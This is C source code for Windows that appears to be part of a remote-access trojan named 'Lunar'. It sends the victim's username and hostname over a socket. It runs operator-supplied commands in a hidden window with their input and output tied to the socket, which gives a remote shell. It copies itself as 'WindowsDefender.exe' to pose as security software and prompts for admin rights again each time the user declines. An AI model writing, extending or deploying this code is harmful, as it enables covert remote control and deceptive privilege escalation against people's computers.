#include "lunar.h"

BOOL isFile(const char* file)
{
	DWORD dwAttrib = GetFileAttributes(file);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

void UserPC()
{
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	sockprintf(sockfd, "%s / %s", username, hostname);

}


void ExecSock(void)
{
    STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sockfd;
	if(CreateProcess(NULL, (LPSTR)recvbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
}


char* cDir()
{
	static char DIR[MAX_PATH];
	memset(DIR, '\0', MAX_PATH);
	GetCurrentDirectory(MAX_PATH, DIR);
	return (char*)DIR;
}

BOOL IsAdmin() {
	BOOL fIsRunAsAdmin = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	PSID pAdministratorsGroup = NULL;

	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&NtAuthority, 2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
		dwError = GetLastError();

	}
	else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
		&fIsRunAsAdmin)) {
		dwError = GetLastError();

	}

	if (pAdministratorsGroup) {
		FreeSid(pAdministratorsGroup);
		pAdministratorsGroup = NULL;
	}

	return fIsRunAsAdmin;
}

void UACTrigger() {
    BOOL isalreadyadmin = IsAdmin();
    if (!isalreadyadmin) {

		SHELLEXECUTEINFO sei = {sizeof(sei)};
		CopyFile( LunarInfo() , "WindowsDefender.exe", FALSE );
		sei.lpVerb = "runas";
		sei.lpFile = "WindowsDefender.exe";
		sei.hwnd = NULL;
		sei.nShow = SW_HIDE;

		if (!ShellExecuteEx(&sei)) {
			DWORD dwError = GetLastError();
			if (dwError == ERROR_CANCELLED)
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE) UACTrigger, 0, 0, 0);
        }
    } 
}

char* LunarInfo()
{
	static char DIR[MAX_PATH];
    GetModuleFileName(NULL, DIR, MAX_PATH);
	return PathFindFileName(DIR);
}
